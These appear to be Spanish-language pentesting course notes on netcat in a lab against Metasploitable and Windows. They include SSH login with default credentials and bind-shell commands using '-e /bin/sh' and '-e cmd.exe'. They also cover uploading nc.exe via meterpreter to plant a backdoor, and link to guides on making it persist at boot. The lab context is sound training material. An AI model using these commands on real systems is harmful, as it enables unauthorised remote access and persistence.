# Netcat

Es una herramienta bastante vieja, es parte de la herramienta de nmap

Lo que hace netcat es abrir un puerto para hacer conexion entre dos maquinas y ellas van a intercambiar informacion remotamente

En las maquinas linux viene por defecto en windows se debe instalar

Lo que podemos hacer para Metasploitable es conectarnos por una conexion ssh desde kali

`ssh msfadmin@192.168.20.23`
y nos pedira el password que desde el principio es msfadmin

dentro de metasploitable a traves de ssh ejecutamos netcat

`nc -L -p 13337`

* nc para ejecutar netcat

* -L para ponerlo en modo listener permanente y con minuscula para que sea mientras la maquina este prendida

* -p 13337 para abrir un puerto y en lo posible abrir un puerto que no este ocupado

y ya con esto queda a la escucha

En una terminal diferente en kali ejecutamos

`nc 192.168.20.23 13337`

Lo que ya nos conectara a la maquina metasploitable


Hasta aqui solo tenemos una conexion en donde se envia texto sin que pase nada mas, es el modo chat

### Un banner grabbing es utilizar nc para conectarnos a una direccion por un puerto que arroje http o https y que nos responda con la web

## Para utilizar el bash con nc

`nc -L -p 13337 -e /bin/sh`

* -e esto hace que se  vincule con el ejecutable en este caso con el shell

# En Windows

Apartir de el exploit que habiamos utilizado en windows subimos el exe de netcat desde el meterpreter lo subimos en c:\WINDOWS\system32

lo subimos con `upload nc.exe`

luego ejecutamos la shell desde el meterpreter

`shell`

Lo que nos mostrara la consola de windows, ya aqui utilizamos 

`nc -L -p 15555 -e cmd.exe`

ya con esto tenemos un backdoor

con lo que podemos abrir la conexion desde kali 

`nc 192.168.20.35 15555`

## Para qeu el netcat se inicie cada vez que se prenda la maquina

https://norfipc.com/comandos/iniciar-programas-windows-automaticamente.html


# Aun mas de Meterpreter

https://bluescreensec.wordpress.com/2015/08/17/post-ataque-meterpreter-parte-i-basico/
